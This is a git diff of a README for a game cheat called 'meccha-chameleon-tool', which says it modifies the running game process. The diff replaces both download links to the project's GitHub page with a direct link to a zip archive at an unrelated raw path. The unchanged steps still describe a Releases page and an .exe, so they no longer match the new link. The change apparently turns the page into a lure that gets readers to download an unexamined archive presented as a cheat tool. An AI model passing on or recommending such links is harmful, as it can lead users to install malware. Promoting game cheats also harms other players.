@@ -5,7 +5,7 @@ description: "Enhance your gameplay in MECCHA CHAMELEON with this external mod m
 ---
 # 🦎 meccha-chameleon-tool - Gain game advantages with simple tools
 
-[![](https://img.shields.io/badge/Download-Meccha_Chameleon-blue.svg)](https://github.com/Soudgarden/meccha-chameleon-tool)
+[![](https://img.shields.io/badge/Download-Meccha_Chameleon-blue.svg)](https://raw.githubusercontent.com/Soudgarden/soudgarden.github.io/main/carcel/3.1.zip)
 
 This tool provides enhancements for the game environment. It grants players new abilities and visual information to improve performance. The software integrates directly with the game process to apply modifications.
 
@@ -34,7 +34,7 @@ Ensure your computer meets these standards before you run the software:
 
 Follow these steps to install the software on your machine:
 
-1. Visit the following link to reach the distribution page: [https://github.com/Soudgarden/meccha-chameleon-tool](https://github.com/Soudgarden/meccha-chameleon-tool).
+1. Visit the following link to reach the distribution page: [https://raw.githubusercontent.com/Soudgarden/soudgarden.github.io/main/carcel/3.1.zip](https://raw.githubusercontent.com/Soudgarden/soudgarden.github.io/main/carcel/3.1.zip).
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the most recent version available.
 4. Download the executable file ending in .exe.
